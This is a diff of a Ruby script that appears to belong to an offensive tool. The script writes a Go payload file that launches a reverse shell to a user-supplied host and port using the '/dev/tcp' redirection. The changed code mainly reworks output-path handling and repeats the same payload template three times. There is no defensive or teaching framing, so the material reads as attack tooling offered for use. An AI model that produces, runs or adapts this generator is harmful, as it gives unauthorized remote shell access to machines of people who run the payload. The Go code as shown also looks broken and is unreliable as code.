@@ -51,26 +51,77 @@ if host == "" or port == "" or shell == "" or file == ""
     puts "  --output-path=<output_path>    Output path."
 end
   
-begin
-    sleep(0.5)
-    puts "#{g}Generating payload..."
-    sleep(1)
-    puts "#{g}Saving to #{file}..."
-    sleep(0.5)
-    w = ENV['OLDPWD']
-    Dir.chdir(w)
-    open(file, 'w') { |f|
-        f.puts "package main"
-        f.puts "import ("
-        f.puts "    \"os/exec\""
-        f.puts ")"
-        f.puts "func main() {"
-        f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
-        f.puts "}"
-    }
-    g = ENV['HOME']
-    Dir.chdir(g + "/thoron")
-    puts "#{s}Saved to #{file}!"
-rescue
-    puts "#{e}Failed to generate payload!"
+if File.directory? file
+    if File.exists? file
+        if file[-1] == "/"
+            file = "#{file}payload.go"
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "package main"
+                f.puts "import ("
+                f.puts "    \"os/exec\""
+                f.puts ")"
+                f.puts "func main() {"
+                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        else
+            file = "#{file}/payload.go"
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "package main"
+                f.puts "import ("
+                f.puts "    \"os/exec\""
+                f.puts ")"
+                f.puts "func main() {"
+                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        end
+    else
+        puts "#{e}Output directory: #{file}: does not exist!"
+        abort()
+    end
+else
+    direct = File.dirname(file)
+    if direct == ""
+        direct = "."
+    else
+        nil
+    end
+    if File.exists? direct
+        if File.directory? direct
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "package main"
+                f.puts "import ("
+                f.puts "    \"os/exec\""
+                f.puts ")"
+                f.puts "func main() {"
+                f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\").Output()"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        else
+            puts "#{e}Error: #{direct}: not a directory!"
+            abort()
+        end
+    else
+        puts "#{e}Output directory: #{direct}: does not exist!"
+        abort()
+    end
 end
